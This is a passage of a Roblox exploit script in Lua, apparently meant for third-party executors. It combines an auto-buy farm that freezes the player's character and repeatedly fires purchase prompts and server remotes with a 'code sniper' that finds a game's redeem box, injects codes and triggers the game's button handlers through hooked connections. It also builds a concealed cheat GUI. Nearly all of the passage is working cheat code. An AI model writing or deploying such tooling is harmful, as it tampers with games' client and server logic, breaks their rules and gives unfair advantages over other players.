                    _autoBuyPurchaseRemote = v
                    return
                end
            end
        end
    end)
    return _autoBuyPurchaseRemote
end
function autoBuyFirePurchase(prompt)
    if not prompt or not prompt.Parent or not prompt.Enabled then return end
    pcall(function()
        if fireproximityprompt then fireproximityprompt(prompt) end
    end)
    task.spawn(function()
        local remote = autoBuyResolveRemote()
        if remote then
            pcall(function()
                if remote:IsA("RemoteFunction") then
                    remote:InvokeServer(prompt.Parent)
                elseif remote:IsA("RemoteEvent") then
                    remote:FireServer(prompt.Parent)
                end
            end)
        end
    end)
end

function autoBuyScanConveyor()
    local results = {}
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return results end
    local origin = hrp.Position

    local ok, parts = pcall(function()
        return Workspace:GetPartBoundsInRadius(origin, _autoBuyRange + 8)
    end)
    if not ok or not parts then return results end

    for _, part in ipairs(parts) do
        if part and part.Parent then
            for _, d in ipairs(part:GetChildren()) do
                if d:IsA("ProximityPrompt") and d.Enabled then
                    local action = (d.ActionText or ""):lower()
                    if action:find("purchase") or action:find("buy") or action:find("comprar") then
                        local dist = (origin - part.Position).Magnitude
                        if dist <= _autoBuyRange then
                            table.insert(results, { prompt = d, part = part, dist = dist })
                        end
                    end
                elseif d:IsA("Attachment") then
                    for _, p in ipairs(d:GetChildren()) do
                        if p:IsA("ProximityPrompt") and p.Enabled then
                            local action = (p.ActionText or ""):lower()
                            if action:find("purchase") or action:find("buy") or action:find("comprar") then
                                local dist = (origin - part.Position).Magnitude
                                if dist <= _autoBuyRange then
                                    table.insert(results, { prompt = p, part = part, dist = dist })
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    table.sort(results, function(a, b) return (a.dist or 0) < (b.dist or 0) end)
    return results
end
function autoBuyRefreshConveyor()
    local ok, found = pcall(autoBuyScanConveyor)
    if ok then _autoBuyConveyorCache = found end
end
function autoBuyAnchorCharacter()
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hrp then return end
    if not _autoBuyAnchorPos then
        _autoBuyAnchorPos = hrp.Position
    end
    pcall(function()
        hrp.Anchored = true
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.CFrame = CFrame.new(_autoBuyAnchorPos) * (hrp.CFrame - hrp.CFrame.Position)
        if hum then
            hum.PlatformStand = false
            hum.Sit = false
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            if hum.UseJumpPower == false then
                hum.JumpHeight = 0
            end
        end
    end)
end
function autoBuyUnanchorCharacter()
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    pcall(function()
        if hrp then hrp.Anchored = false end
        if hum then
            hum.WalkSpeed = 16
            hum.JumpPower = 50
            if hum.UseJumpPower == false then
                hum.JumpHeight = 7.2
            end
        end
    end)
    _autoBuyAnchorPos = nil
end
function autoBuyUpdate()
    if not _autoBuyActive then
        _autoBuyLockedTarget = nil
        return
    end
    autoBuyAnchorCharacter()
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    for _, entry in ipairs(_autoBuyConveyorCache) do
        if entry.prompt and entry.prompt.Parent and entry.prompt.Enabled and entry.part and entry.part.Parent then
            local dist = (hrp.Position - entry.part.Position).Magnitude
            if dist <= _autoBuyRange then
                _autoBuyLockedTarget = entry
                autoBuyFirePurchase(entry.prompt)
            end
        end
    end
end
function autoBuyStart()
    if _autoBuyActive then return end
    _autoBuyActive = true
    _autoFarm = true
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if hrp then _autoBuyAnchorPos = hrp.Position end
    autoBuyAnchorCharacter()
    autoBuyRefreshConveyor()
    if not _autoBuyBuyLoop then
        _autoBuyBuyLoop = task.spawn(function()
            while _instanceRunning do
                task.wait(BUY_INTERVAL)
                if _autoBuyActive then pcall(autoBuyUpdate) end
            end
        end)
    end
    if not _autoBuyScanLoop then
        _autoBuyScanLoop = task.spawn(function()
            while _instanceRunning do
                task.wait(0.9)
                if _autoBuyActive then pcall(autoBuyRefreshConveyor) end
            end
        end)
    end
    if not _autoBuyAnchorConn then
        _autoBuyAnchorConn = RunService.Heartbeat:Connect(function()
            if _autoBuyActive then pcall(autoBuyAnchorCharacter) end
        end)
    end
end
function autoBuyStop()
    if not _autoBuyActive then return end
    _autoBuyActive = false
    _autoFarm = false
    _autoBuyLockedTarget = nil
    if _autoBuyAnchorConn then
        pcall(function() _autoBuyAnchorConn:Disconnect() end)
        _autoBuyAnchorConn = nil
    end
    autoBuyUnanchorCharacter()
end

-- CONFIGURATION SYSTEM --
local CONFIG_FILE = "calcium_code_sniper_auto_redeem_test_config.json"
local savedConfig = {
    codeSniper = true,
    autoSubmit = true,
    submitAfter = 1,
    retypeInvalid = false,
    riddleSolver = false,
    autoFarm = false,
    spamRedeem = true,
    kbCodeSniper = "F1",
    kbAutoSubmit = "F2",
    kbRiddleSolver = "F3",
    kbRetypeInvalid = "F4",
    kbAutoFarm = "F5",
    kbManualSubmit = "F6",
}
pcall(function()
    if type(isfile) == "function" and type(readfile) == "function"
    and isfile(CONFIG_FILE) then
        local decoded = HttpService:JSONDecode(readfile(CONFIG_FILE))
        if type(decoded) == "table" then
            if type(decoded.codeSniper) == "boolean" then savedConfig.codeSniper = decoded.codeSniper end
            if type(decoded.autoSubmit) == "boolean" then savedConfig.autoSubmit = decoded.autoSubmit end
            if type(decoded.submitAfter) == "number" then savedConfig.submitAfter = math.max(1, math.floor(decoded.submitAfter)) end
            if type(decoded.retypeInvalid) == "boolean" then savedConfig.retypeInvalid = decoded.retypeInvalid end
            if type(decoded.riddleSolver) == "boolean" then savedConfig.riddleSolver = decoded.riddleSolver end
            if type(decoded.autoFarm) == "boolean" then savedConfig.autoFarm = decoded.autoFarm end
            if type(decoded.spamRedeem) == "boolean" then savedConfig.spamRedeem = decoded.spamRedeem end
            if type(decoded.kbCodeSniper) == "string" then savedConfig.kbCodeSniper = decoded.kbCodeSniper end
            if type(decoded.kbAutoSubmit) == "string" then savedConfig.kbAutoSubmit = decoded.kbAutoSubmit end
            if type(decoded.kbRiddleSolver) == "string" then savedConfig.kbRiddleSolver = decoded.kbRiddleSolver end
            if type(decoded.kbRetypeInvalid) == "string" then savedConfig.kbRetypeInvalid = decoded.kbRetypeInvalid end
            if type(decoded.kbAutoFarm) == "string" then savedConfig.kbAutoFarm = decoded.kbAutoFarm end
            if type(decoded.kbManualSubmit) == "string" then savedConfig.kbManualSubmit = decoded.kbManualSubmit end
            if decoded.kbCodeSniper == false or decoded.kbCodeSniper == "" then savedConfig.kbCodeSniper = nil end
            if decoded.kbAutoSubmit == false or decoded.kbAutoSubmit == "" then savedConfig.kbAutoSubmit = nil end
            if decoded.kbRiddleSolver == false or decoded.kbRiddleSolver == "" then savedConfig.kbRiddleSolver = nil end
            if decoded.kbRetypeInvalid == false or decoded.kbRetypeInvalid == "" then savedConfig.kbRetypeInvalid = nil end
            if decoded.kbAutoFarm == false or decoded.kbAutoFarm == "" then savedConfig.kbAutoFarm = nil end
            if decoded.kbManualSubmit == false or decoded.kbManualSubmit == "" then savedConfig.kbManualSubmit = nil end
        end
    end
end)

function saveConfig()
    if type(writefile) ~= "function" then return end
    pcall(function()
        writefile(CONFIG_FILE, HttpService:JSONEncode({
            codeSniper = savedConfig.codeSniper,
            autoSubmit = savedConfig.autoSubmit,
            submitAfter = savedConfig.submitAfter,
            retypeInvalid = savedConfig.retypeInvalid,
            riddleSolver = savedConfig.riddleSolver,
            autoFarm = savedConfig.autoFarm,
            spamRedeem = savedConfig.spamRedeem ~= false,
            kbCodeSniper = savedConfig.kbCodeSniper,
            kbAutoSubmit = savedConfig.kbAutoSubmit,
            kbRiddleSolver = savedConfig.kbRiddleSolver,
            kbRetypeInvalid = savedConfig.kbRetypeInvalid,
            kbAutoFarm = savedConfig.kbAutoFarm,
            kbManualSubmit = savedConfig.kbManualSubmit,
        }))
    end)
end

-- STATE VARIABLES --
local _enabled              = (savedConfig.codeSniper ~= false)
local _seen                 = {}
local _focused              = nil
local _lastBox              = nil
local _autoAccept           = (savedConfig.autoSubmit ~= false)
local _submitAfter          = math.max(1, tonumber(savedConfig.submitAfter) or 1)
local _capturedParts        = {}
local _lastWatchedBox       = nil
local _boxTextConn          = nil
local _boxAncestryConn      = nil
local _retypeInvalid        = savedConfig.retypeInvalid
local _riddleSolver         = savedConfig.riddleSolver
_autoFarm                   = (savedConfig.autoFarm == true)
local _spamRedeem           = (savedConfig.spamRedeem ~= false)
task.defer(function()
    if _autoFarm then pcall(autoBuyStart) end
end)
local _lastNonBlankBoxText  = ""
local _pendingRejectedText  = nil
local _pendingRejectedBox   = nil
local _pendingRejectedUntil = 0
local _pendingRejectedToken = 0

local getupvalues = (debug and debug.getupvalues) or getupvalues
local getconns    = getconnections or (debug and debug.getconnections)
local setupv      = (debug and debug.setupvalue) or setupvalue

local setStatus, flashCode, appendToBox
local rememberPendingSubmission, clearPendingSubmission, handleRedemptionFeedback
local clearCalciumCapture
local _lastStatusMsg = nil

-- UTILITY & REDEEM LOGIC --
function isOurGui(instance)
    local p = instance
    for _ = 1, 10 do
        if not p then break end
        if p.Name == "CalciumCodeSniperUI" or p.Name == "SourcesHubRedeemerGui" then return true end
        p = p.Parent
    end
    return false
end

function isVisibleChain(inst)
    local current = inst
    while current do
        if current:IsA("GuiObject") and not current.Visible then return false end
        if current:IsA("ScreenGui") then return current.Enabled end
        current = current.Parent
    end
    return true
end

-- ============================================================
-- CALCIUM V5 / EVENT-DRIVEN CODEBOX LINK
-- Hot path uses one cached TextBox and ONE submit handler.
-- No per-frame click watchdog, no render-step flush and no
-- full PlayerGui scan when a code arrives after initial linking.
-- ============================================================
local RedeemSpeedUI = { label = nil, set = nil }
local _SetClip = (typeof(setclipboard) == "function") and setclipboard
              or (typeof(toclipboard) == "function") and toclipboard
              or (syn and syn.write_clipboard) or nil
local _FireSignal = (typeof(firesignal) == "function") and firesignal or nil
local _FireClick = (typeof(fireclick) == "function") and fireclick or nil
local _GetConns = (typeof(getconnections) == "function") and getconnections
               or (typeof(getconns) == "function") and getconns
               or (debug and debug.getconnections) or nil

local _fastTargets = {}
local _fastTargetKey = nil
local _primaryTarget = nil
local _lastLinkScan = -1e9
local _linkDirty = true
local _linkScanQueued = false
local _lastSubmitCode = nil
local _lastSubmitAt = -1e9
local _lastLinkDescription = "SEARCHING"

-- Diagnostic available in the Nova GUI and the console.
local function linkInfo()
    if not _primaryTarget or not _primaryTarget.box or not _primaryTarget.box.Parent then
        return "NO CODEBOX"
    end
    if _primaryTarget.btn and _primaryTarget.btn.Parent then
        return "CODEBOX + SUBMIT LINKED"
    end
    return "CODEBOX LINKED / BUTTON NOT FOUND"
end

local function externalGui(inst)
    if not inst or not inst.Parent then return false end
    if isOurGui(inst) then return false end
    if GUI and inst:IsDescendantOf(GUI) then return false end
    return inst:IsDescendantOf(playerGui)
end

local function codeScore(box)
    local score = 0
    local name = string.lower(box.Name or "")
    local placeholder = string.lower(box.PlaceholderText or "")
    local parent = box.Parent
    local pn = parent and string.lower(parent.Name or "") or ""
    local root = box:FindFirstAncestor("Codes")
    if root then score += 90 end
    if name == "codebox" or name == "codeinput" or name == "code" then score += 90 end
    if name:find("code",1,true) or name:find("redeem",1,true) then score += 45 end
    if name:find("input",1,true) or name:find("promo",1,true) then score += 22 end
    if pn:find("code",1,true) or pn:find("redeem",1,true) then score += 36 end
    if placeholder:find("code",1,true) or placeholder:find("redeem",1,true) then score += 45 end
    if box.Visible then score += 4 end
    if box.TextEditable then score += 1 end
    return score
end

local function buttonScore(btn, box)
    if not btn or not btn.Parent then return -1e9 end
    local name = string.lower(btn.Name or "")
    local bt = ""
    pcall(function() bt = string.lower(btn.Text or "") end)
    local score = 0
    if name:find("redeem",1,true) or name:find("submit",1,true) then score += 100 end
    if bt:find("redeem",1,true) or bt:find("submit",1,true) then score += 110 end
    if name:find("claim",1,true) or bt:find("claim",1,true) then score += 35 end
    if name:find("enter",1,true) or bt:find("enter",1,true) then score += 20 end
    if btn.Parent == box.Parent then score += 70 end
    if btn:FindFirstAncestor("Codes") and box:FindFirstAncestor("Codes") then score += 45 end
    if btn.Visible then score += 2 end
    return score
end

local function getConnections(signal)
    if not _GetConns then return nil end
    local ok, list = pcall(_GetConns, signal)
    if ok and type(list) == "table" then return list end
    return nil
end

local function hasConnection(list)
    if not list then return false end
    for _, connection in ipairs(list) do
        if connection.Enabled ~= false then return true end
    end
    return false
end

local function invokeSignal(signal, args, cachedConnections)
    -- Use one path, never firesignal AND all connections for the same event.
    if _FireSignal then
        local ok = pcall(_FireSignal, signal, table.unpack(args or {}))
        if ok then return true end
    end
    local cons = cachedConnections or getConnections(signal)
    if cons then
        for _, c in ipairs(cons) do
            if c.Enabled ~= false then
                local ok = pcall(function()
                    if c.Fire then c:Fire(table.unpack(args or {}))
                    elseif type(c.Function) == "function" then c.Function(table.unpack(args or {}))
                    else error("no signal function") end
                end)
                if ok then return true end
            end
        end
    end
    return false
end

local function makeTarget(box, btn)
    local t = {box=box, btn=btn}
    t.alive = function()
        return externalGui(box) and (not t.btn or externalGui(t.btn))
    end
    t.setText = function(code)
        local ok = pcall(function() box.Text = code end)
        return ok and box.Text == code
    end
    t.focusConns = getConnections(box.FocusLost)
    if btn then
        t.activateConns = getConnections(btn.Activated)
        t.clickConns = getConnections(btn.MouseButton1Click)
    end
    t.submit = function()
        if btn and not hasConnection(t.activateConns) and not hasConnection(t.clickConns) then
            t.activateConns = getConnections(btn.Activated)
            t.clickConns = getConnections(btn.MouseButton1Click)
        end
        if not hasConnection(t.focusConns) then
            t.focusConns = getConnections(box.FocusLost)
        end
        -- Prefer a bound button handler. Only fall back to focus loss when
        -- no button handler is accessible. This avoids double-redemption.
        if btn and externalGui(btn) then
            local signal, cons
            if hasConnection(t.activateConns) then
                signal, cons = btn.Activated, t.activateConns
            elseif hasConnection(t.clickConns) then
                signal, cons = btn.MouseButton1Click, t.clickConns
            else
                signal, cons = btn.MouseButton1Click, t.clickConns
            end
            if invokeSignal(signal, {}, cons) then return true, "button" end
            if _FireClick and pcall(_FireClick, btn) then return true, "click" end
            if pcall(function() btn:Activate() end) then return true, "activate" end
        end
        if hasConnection(t.focusConns) or _FireSignal then
            local focused = false
            pcall(function() focused = box:IsFocused() end)
            if focused and pcall(function() box:ReleaseFocus(true) end) then
                return true, "focus"
            end
            if invokeSignal(box.FocusLost, {true}, t.focusConns) then
                return true, "focus"
            end
        end
        return false, "no working submit handler"
    end
    return t
end

local function resolveCodeTarget()
    local roots = {}
    local explicit = playerGui:FindFirstChild("Codes")
    if explicit then
        -- Search the entire Codes ScreenGui: button and box can be in
        -- different frames, unlike the previous matcher.
        roots[#roots+1] = {root=explicit, priority=300}
    end
    for _, child in ipairs(playerGui:GetChildren()) do
        if child:IsA("ScreenGui") and child ~= explicit and child.Enabled and not isOurGui(child) then
            roots[#roots+1] = {root=child, priority=0}
        end
    end
    local bestBox, bestButton, bestScore = nil, nil, -1e9
    for _, entry in ipairs(roots) do
        local boxes, buttons = {}, {}
        for _, d in ipairs(entry.root:GetDescendants()) do
            if externalGui(d) then
                if d:IsA("TextBox") then boxes[#boxes+1] = d end
                if d:IsA("TextButton") or d:IsA("ImageButton") then
                    buttons[#buttons+1] = d
                end
            end
        end
        for _, box in ipairs(boxes) do
            local score = codeScore(box) + entry.priority
            -- Skip unrelated inputs in non-Code GUIs.
            if score >= 30 then
                local btn, btnScore = nil, -1e9
                for _, candidate in ipairs(buttons) do
                    local candidateScore = buttonScore(candidate, box)
                    if candidateScore > btnScore then
                        btn, btnScore = candidate, candidateScore
                    end
                end
                -- Only accept a named redeem action or a sibling control;
                -- never trigger unrelated UI buttons.
                if btnScore < 65 then btn = nil end
                local pairScore = score + (btn and 30 or 0)
                if pairScore > bestScore then
                    bestBox, bestButton, bestScore = box, btn, pairScore
                end
            end
        end
    end
    if not bestBox then return nil end
    return makeTarget(bestBox, bestButton)
end

local function refreshFastTargets(force)
    if not _instanceRunning then return end
    local now = os.clock()
    if not force and not _linkDirty and _primaryTarget and _primaryTarget.alive() and _primaryTarget.btn then return end
    if not force and now - _lastLinkScan < 0.07 then return end
    _lastLinkScan = now
    local target = resolveCodeTarget()
    _primaryTarget = target
    _fastTargets = target and {target} or {}
    _fastTargetKey = target and tostring(target.box) .. ":" .. tostring(target.btn) or ""
    _linkDirty = false
    _cachedBox = target and target.box or nil
    _cachedSubmitBtn = target and target.btn or nil
    _cachedBoxTime = now
    local desc = linkInfo()
    if desc ~= _lastLinkDescription then
        _lastLinkDescription = desc
        pcall(function()
            if setStatus then setStatus("Codebox: " .. desc) end
        end)
    end
end

local function scheduleRelink()
    _linkDirty = true
    if _linkScanQueued then return end
    _linkScanQueued = true
    task.defer(function()
        _linkScanQueued = false
        if _instanceRunning then refreshFastTargets(false) end
    end)
end

-- Automatic relinking when the game recreates its code GUI; the target
-- itself is cached and no periodic RenderStepped work is needed.
_targetWatcherListener = playerGui.DescendantAdded:Connect(function(d)
    if d:IsA("TextBox") or d:IsA("TextButton") or d:IsA("ImageButton") then
        scheduleRelink()
    end
end)
local _codeboxRemovedListener = playerGui.DescendantRemoving:Connect(function(d)
    if _primaryTarget and (d == _primaryTarget.box or d == _primaryTarget.btn) then
        _primaryTarget = nil
        _cachedBox, _cachedSubmitBtn = nil, nil
        scheduleRelink()
    end
end)

-- Always-on fallback: code GUIs can be enabled/renamed without adding a
-- descendant. No frame-by-frame scanning: check at most once per 1.25s and
-- only search again when the paired target is gone or incomplete.
local _codeboxAutoLinkConn
local _codeboxAutoLinkElapsed = 0
_codeboxAutoLinkConn = RunService.Heartbeat:Connect(function(dt)
    if not _instanceRunning then
        if _codeboxAutoLinkConn then _codeboxAutoLinkConn:Disconnect() end
        return
    end
    _codeboxAutoLinkElapsed += math.min(dt, 0.25)
    if _codeboxAutoLinkElapsed < 1.25 then return end
    _codeboxAutoLinkElapsed = 0
    if not _primaryTarget or not _primaryTarget.alive()
        or not _primaryTarget.btn or _linkDirty then
        refreshFastTargets(false)
    end
end)

function findAllTextBoxes()
    local t = _primaryTarget
    if t and t.alive() then return {t.box} end
    refreshFastTargets(true)
    t = _primaryTarget
    return t and t.alive() and {t.box} or {}
end

function findCodeButtons()
    local t = _primaryTarget
    if t and t.alive() and t.btn then return {t.btn} end
    refreshFastTargets(true)
    t = _primaryTarget
    return t and t.alive() and t.btn and {t.btn} or {}
end

function clickButton(btn)
    if not btn then return false end
    local a = getConnections(btn.Activated)
    local c = getConnections(btn.MouseButton1Click)
    if hasConnection(a) then return invokeSignal(btn.Activated, {}, a) end
    if invokeSignal(btn.MouseButton1Click, {}, c) then return true end
    if _FireClick and pcall(_FireClick, btn) then return true end
    return pcall(function() btn:Activate() end)
end

function fireBoxFocusLost(box)
    if not box then return false end
    local focused = false
    pcall(function() focused = box:IsFocused() end)
    if focused and pcall(function() box:ReleaseFocus(true) end) then return true end
    return invokeSignal(box.FocusLost, {true})
end

function ultraFastSubmit(code)
    local start = os.clock()
    code = tostring(code or ""):match("^%s*(.-)%s*$") or ""
    if code == "" then return false, "empty code", 0 end
    if not _instanceRunning then return false, "engine stopped", 0 end

    -- Avoid sending one announcement through two branches in the same frame.
    if code == _lastSubmitCode and start - _lastSubmitAt < 0.12 then
        return true, "already submitted", (os.clock() - start) * 1000
    end
    local t = _primaryTarget
    if not t or not t.alive() or _linkDirty then
        refreshFastTargets(true)
        t = _primaryTarget
    end
    if not t or not t.alive() then
        return false, "codebox not connected", (os.clock() - start) * 1000
    end
    if not t.setText(code) then
        scheduleRelink()
        return false, "could not write codebox", (os.clock() - start) * 1000
    end
    _lastBox = t.box
    _lastNonBlankBoxText = code
    local dispatched, method = t.submit()
    if not dispatched then
        return false, method, (os.clock() - start) * 1000
    end
    _lastSubmitCode, _lastSubmitAt = code, os.clock()
    -- This is local dispatch time, NOT server acceptance or network latency.
    return true, "submitted via " .. tostring(method), (os.clock() - start) * 1000
end

function timedSubmit(code)
    return ultraFastSubmit(code)
end

function calciumCodeBox()
    local t = _primaryTarget
    if t and t.alive() then return t.box end
    refreshFastTargets(true)
    t = _primaryTarget
    return t and t.alive() and t.box or nil
end

_boxFocusedListener = UserInputService.TextBoxFocused:Connect(function(box)
    if GUI and box:IsDescendantOf(GUI) then return end
    if not externalGui(box) then return end
    if box:IsA("TextBox") and (codeScore(box) >= 30) then
        if not _primaryTarget or _primaryTarget.box ~= box then
            _cachedBox = box
            _cachedBoxTime = os.clock()
            scheduleRelink()
        end
        _focused = box
        _lastBox = box
        if watchBoxForBlankReset then watchBoxForBlankReset(box) end
    end
end)

task.defer(function()
    refreshFastTargets(true)
end)

-- STYLING & HELPER UTILITIES
local COLORS = {
    Window = Color3.fromRGB(12, 13, 18),
    Row = Color3.fromRGB(18, 20, 28),
    Control = Color3.fromRGB(26, 28, 36),
    Log = Color3.fromRGB(8, 9, 12),
    Border = Color3.fromRGB(48, 54, 68),
    White = Color3.fromRGB(245, 248, 255),
    Text = Color3.fromRGB(220, 228, 242),
    Dim = Color3.fromRGB(150, 165, 190),
    Accent = Color3.fromRGB(110, 180, 255),
    Green = Color3.fromRGB(80, 220, 130),
    Red = Color3.fromRGB(255, 75, 85),
    Gold = Color3.fromRGB(255, 205, 90),
    Pink = Color3.fromRGB(255, 130, 200),
}

function addCorner(parent, radius)
    local value = Instance.new("UICorner")
    value.CornerRadius = UDim.new(0, radius)
    value.Parent = parent
    return value
end

function addStroke(parent, color, thickness, transparency)
    local value = Instance.new("UIStroke")
    value.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    value.Color = color
    value.Thickness = thickness or 1
    value.Transparency = transparency or 0
    value.Parent = parent
    return value
end

function makeLabel(parent, name, text, size, position, textSize, color, font)
    local label = Instance.new("TextLabel")
    label.Name = name
    label.Size = size
    label.Position = position
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextSize = textSize
    label.TextColor3 = color
    label.Font = font or Enum.Font.GothamMedium
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.TextStrokeTransparency = 0.55
    label.Parent = parent
    return label
end

-- CLEANUP OLD GUIS --
pcall(function()
    for _, name in ipairs({"CalciumCodeSniperUI", "AutoTypeCodesUI", "CalciumPaste"}) do
        local previous = game.CoreGui:FindFirstChild(name)
        if previous then previous:Destroy() end
    end
end)
for _, name in ipairs({"CalciumCodeSniperUI", "AutoTypeCodesUI", "CalciumPaste"}) do
    local previous = playerGui:FindFirstChild(name)
    if previous then previous:Destroy() end
end

-- MAIN GUI CREATION --
GUI = Instance.new("ScreenGui")
GUI.Name = "CalciumCodeSniperUI"
-- Keep every legacy UI element hidden while Nova initializes.
GUI.Enabled = false
GUI.ResetOnSpawn = false
GUI.IgnoreGuiInset = true
GUI.DisplayOrder = 999
GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
if not pcall(function() GUI.Parent = game.CoreGui end) then GUI.Parent = playerGui end

local Window = Instance.new("Frame")
Window.Name = "Window"
Window.Size = UDim2.fromOffset(310, 620)
Window.AnchorPoint = Vector2.new(1, 0)
Window.Position = UDim2.new(1, -8, 0, 8)
Window.BackgroundColor3 = Color3.fromRGB(14, 16, 22)
Window.BackgroundTransparency = 1
Window.BorderSizePixel = 0
Window.ClipsDescendants = true
-- Legacy window still supplies backend label references, but never renders.
Window.Visible = false
Window.Parent = GUI
addCorner(Window, 14)

Window.BackgroundTransparency = 1
do
    local bgImg = Instance.new("ImageLabel")
    bgImg.Name = "BgImage"
    bgImg.Size = UDim2.fromScale(1, 1)
    bgImg.Position = UDim2.fromScale(0, 0)
    bgImg.BackgroundColor3 = Color3.fromRGB(8, 10, 14)
    bgImg.BackgroundTransparency = 0
    bgImg.Image = "rbxassetid://129085053275432"
    bgImg.ScaleType = Enum.ScaleType.Crop
    bgImg.ImageTransparency = 0.15
    bgImg.ZIndex = 1
    bgImg.Parent = Window
    addCorner(bgImg, 14)

    local dim = Instance.new("Frame")
    dim.Name = "BgDim"
    dim.Size = UDim2.fromScale(1, 1)
    dim.BackgroundColor3 = Color3.fromRGB(4, 6, 10)
    dim.BackgroundTransparency = 0.42
    dim.BorderSizePixel = 0
    dim.ZIndex = 2
    dim.Parent = Window
    addCorner(dim, 14)
end

local WindowStrokeRef = addStroke(Window, Color3.fromRGB(70, 130, 200), 1.4, 0.5)

do
    local pop = Instance.new("UIScale")
    pop.Name = "OpenPop"
    pop.Scale = 0.88
    pop.Parent = Window
    task.spawn(function()
        pcall(function()
            TweenService:Create(pop, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
        end)
        task.delay(0.35, function()
            if pop and pop.Parent then pop:Destroy() end
        end)
    end)
end

_G.CalciumPulseRefs = _G.CalciumPulseRefs or {
    windowStroke  = nil,
    headerAccent  = nil,
    execDot       = nil,
    consoleStroke = nil,
    consolePulse  = nil,
    manualSubmit  = nil,
    miniAvatar    = nil,
    ogBtn         = nil,
    ogDot         = nil,
    mainStars     = nil,
    ogStars       = nil,
    miniStars     = nil,
}

do
    local pulseRefs = _G.CalciumPulseRefs
    pulseRefs.windowStroke = WindowStrokeRef

    local _accum = 0
    local conn
    conn = RunService.Heartbeat:Connect(function(dt)
        _accum = _accum + dt
        if _accum < 0.033 then return end
        local dtEff = _accum
        _accum = 0

        local refs = _G.CalciumPulseRefs
        if not refs or not GUI or not GUI.Parent then
            if conn then conn:Disconnect() end
            return
        end
        if not Window or not Window.Visible then return end -- old UI hidden by Nova

        local t = tick()

        local ws = refs.windowStroke
        if ws and ws.Parent then
            local p = math.sin(t * 1.4) * 0.5 + 0.5
            ws.Transparency = 0.4 + p * 0.25
            ws.Thickness    = 1.2 + p * 0.4
        end

        local ha = refs.headerAccent
        if ha and ha.Parent then
            local p = math.sin(t * 2.2) * 0.5 + 0.5
            ha.BackgroundTransparency = 0.35 + p * 0.4
        end

        local ed = refs.execDot
        if ed and ed.Parent then
            local p = math.sin(t * 3.0) * 0.5 + 0.5
            ed.BackgroundTransparency = 0.05 + p * 0.5
            ed.BackgroundColor3 = Color3.fromRGB(
                math.floor(70 + p * 40),
                math.floor(200 + p * 40),
                math.floor(120 + p * 30)
            )
        end

        local cs = refs.consoleStroke
        if cs and cs.Parent then
            local p = math.sin(t * 1.4) * 0.5 + 0.5
            cs.Transparency = 0.4 + p * 0.35
        end

        local cp = refs.consolePulse
        if cp and cp.Parent then
            local p = math.sin(t * 3.2) * 0.5 + 0.5
            cp.TextTransparency = 0.05 + p * 0.55
            cp.TextStrokeTransparency = 0.35 + p * 0.45
            cp.TextColor3 = Color3.fromRGB(
                math.floor(100 + p * 40),
                math.floor(180 + p * 40),
                255
            )
        end

        local ms = refs.manualSubmit
        if ms and ms.Parent then
            local p = math.sin(t * 2.4) * 0.5 + 0.5
            ms.BackgroundColor3 = Color3.fromRGB(
                math.floor(30 + p * 25),
                math.floor(70 + p * 40),
                math.floor(140 + p * 50)
            )
        end

        local ma = refs.miniAvatar
        if ma and ma.Parent then
            local p = math.sin(t * 2.6) * 0.5 + 0.5
            ma.Transparency = 0.15 + p * 0.45
            ma.Color = COLORS.Accent
        end

        local ob = refs.ogBtn
        if ob and ob.Parent then
            local p = math.sin(t * 2.4) * 0.5 + 0.5
            ob.Transparency = 0.35 + p * 0.4
        end

        local od = refs.ogDot
        if od and od.Parent then
            local isOpen = getgenv and getgenv().CalciumOGSniperGui and getgenv().CalciumOGSniperGui.Parent
            od.BackgroundColor3 = isOpen and COLORS.Green or COLORS.Dim
        end

        local msLayer = refs.mainStars
        if msLayer and msLayer.layer and msLayer.layer.Parent and Window and Window.Parent and Window.Visible then
            local h = math.max(1, Window.AbsoluteSize.Y)
            local w = math.max(1, Window.AbsoluteSize.X)
            for _, s in ipairs(msLayer.pool) do
                local fr = s.frame
                if fr and fr.Parent then
                    local x = fr.Position.X.Offset + s.drift * dtEff
                    local y = fr.Position.Y.Offset + s.speed * dtEff
                    if y > h + 8 then
                        y = -6 - math.random() * 20
                        x = math.random() * w
                        s.speed = 12 + math.random() * 38
                        s.drift = (math.random() - 0.5) * 18
                    end
                    if x < -8 then x = w + 2 end
                    if x > w + 8 then x = -2 end
                    fr.Position = UDim2.fromOffset(x, y)
                    s.twinkle = s.twinkle + dtEff * s.twSpeed
                    fr.BackgroundTransparency = 0.12 + (math.sin(s.twinkle) * 0.5 + 0.5) * 0.6
                end
            end
        end

        local mnLayer = refs.miniStars
        if mnLayer and mnLayer.layer and mnLayer.layer.Parent and MiniView and MiniView.Visible then
            local h = math.max(1, MiniView.AbsoluteSize.Y)
            local w = math.max(1, MiniView.AbsoluteSize.X)
            for _, s in ipairs(mnLayer.pool) do
                local fr = s.frame
                if fr and fr.Parent then
                    local x = fr.Position.X.Offset + s.drift * dtEff
                    local y = fr.Position.Y.Offset + s.speed * dtEff
                    if y > h + 6 then
                        y = -4 - math.random() * 10
                        x = math.random() * w
                        s.speed = 18 + math.random() * 42
                        s.drift = (math.random() - 0.5) * 12
                    end
                    if x < -6 then x = w + 2 end
                    if x > w + 6 then x = -2 end
                    fr.Position = UDim2.fromOffset(x, y)
                    s.twinkle = s.twinkle + dtEff * 3
                    fr.BackgroundTransparency = 0.2 + (math.sin(s.twinkle) * 0.5 + 0.5) * 0.55
                end
            end
        end

        local ogLayer = refs.ogStars
        if ogLayer and ogLayer.layer and ogLayer.layer.Parent and ogLayer.frame and ogLayer.frame.Parent and ogLayer.frame.Visible then
